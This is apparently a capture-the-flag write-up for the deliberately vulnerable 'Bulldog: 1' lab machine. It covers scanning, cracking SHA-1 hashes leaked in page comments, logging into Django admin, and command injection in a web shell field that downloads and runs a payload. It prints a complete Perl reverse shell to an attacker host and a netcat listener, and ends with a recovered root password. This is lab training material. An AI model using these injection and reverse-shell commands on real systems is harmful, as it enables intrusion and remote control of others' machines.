Bulldog: 1 write-up


scan host:

nikto http://192.168.56.101:8080/

/home/r1s3/storage/ctf/some/vuln_hub/Bulldog_1
![alt text](https://github.com/s1l3xz/some/vuln_hub/Bulldog_1/blob/master/nikto_scan.jpg)

	
	find /dev dir


Visit http://192.168.56.101:8080/dev/
	
find comments in web page source

![alt text](https://github.com/s1l3xz/some/vuln_hub/Bulldog_1/blob/master/comments.png)

	<!--Need these password hashes for testing. Django's default is too complex-->
	<!--We'll remove these in prod. It's not like a hacker can do anything with a hash-->
	Team Lead: alan@bulldogindustries.com<br><!--6515229daf8dbdc8b89fed2e60f107433da5f2cb-->
	Back-up Team Lead: william@bulldogindustries.com<br><br><!--38882f3b81f8f2bc47d9f3119155b05f954892fb-->
	Front End: malik@bulldogindustries.com<br><!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279-->
	Front End: kevin@bulldogindustries.com<br><br><!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9-->
	Back End: ashley@bulldogindustries.com<br><!--553d917a396414ab99785694afd51df3a8a8a3e0-->
	Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5-->
	Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->


Try to brute forse over : https://crackstation.net/

	Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--> bulldog  ( sha1 )

	Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--> bulldoglover ( sha1 )



Login to django admin page http://192.168.56.101:8080/admin with one of credentials


Than go to  http://192.168.56.101:8080/dev/shell/

Find CLI vulnerability in command field:

![alt text](https://github.com/s1l3xz/some/vuln_hub/Bulldog_1/blob/master/CLI.png)

store perl reverse shell on my remote apache server:

use Socket;$i="192.168.56.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};

use CLI to downlod perl rev shell on bulldog machine:

ls & wget http://attacker_server/perl_script.pl -O /tmp/lol.pl


open nc on attacker side : nc -lvp 1234

execute perl script over CLI :ls & perl /tmp/lol2.pl & id


Get rev shell under jango

![alt text](https://github.com/s1l3xz/some/vuln_hub/Bulldog_1/blob/master/rev_shell.png)

find customPermissionApp elf file in /home/bulldogadmin/.hiddenadmindirectory directory

reverse elf , find root password : SUPERultimatePASSWORDyouCANTget

execute: sudo su root

got root ;

find secret in /root/congrats.txt

![alt text](https://github.com/s1l3xz/some/vuln_hub/Bulldog_1/blob/master/proof.jpg)